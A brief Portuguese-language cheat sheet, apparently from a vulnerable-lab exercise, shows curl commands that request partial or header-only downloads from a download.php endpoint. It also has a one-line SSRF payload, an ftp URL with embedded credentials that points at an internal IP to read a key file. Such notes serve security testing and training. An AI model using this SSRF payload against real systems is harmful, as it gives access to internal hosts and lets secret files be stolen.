### Baixar apenas o cabeçalho da imagem:
```sh
curl -H "Range: bytes=0-1000" "http://storage.vuln.lab/download.php?file=image-309kb.jpg" --output downloaded.jpg
curl -I HEAD "http://storage.vuln.lab/download.php?file=fake-image.jpg"
```

## SSRF
```
ftp://appsec:4pp2Ecs077@172.22.22.60/home/appsec/key.txt
```